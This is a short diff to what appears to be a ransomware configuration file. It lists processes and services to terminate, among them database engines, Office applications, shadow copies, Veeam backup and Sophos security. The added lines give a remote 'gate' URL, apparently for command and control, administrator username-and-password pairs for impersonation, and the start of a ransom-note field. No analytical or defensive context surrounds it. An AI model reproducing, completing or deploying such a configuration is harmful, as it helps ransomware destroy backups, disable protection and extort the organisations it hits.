@@ -25,4 +25,13 @@
     "white_hosts": "WS2019",
     "kill_processes": "sql;oracle;ocssd;dbsnmp;synctime;agntsvc;isqlplussvc;xfssvccon;mydesktopservice;ocautoupds;encsvc;firefox;tbirdconfig;mydesktopqos;ocomm;dbeng50;sqbcoreservice;excel;infopath;msaccess;mspub;onenote;outlook;powerpnt;steam;thebat;thunderbird;visio;winword;wordpad;notepad;calc;wuauclt;onedrive",
     "kill_services": "vss;sql;svc$;memtas;mepocs;msexchange;sophos;veeam;backup;GxVss;GxBlr;GxFWD;GxCVD;GxCIMgr",
+    "gate_urls": "https://test.molombitoh1ck3r.com/",
+    "impers_accounts": "ad.lab:Qwerty!;Administrator:123QWEqwe!@#;Admin2:P@ssw0rd;Administrator:P@ssw0rd;Administrator:Qwerty!;Administrator:123QWEqwe;Administrator:123QWEqweqwe",
+    "note": "
+  
+                 ~~~~~~~~~~                           ~~~~~~~~~~
+                                   ~~~~~~~~~~~ 
+
+  
+  
   
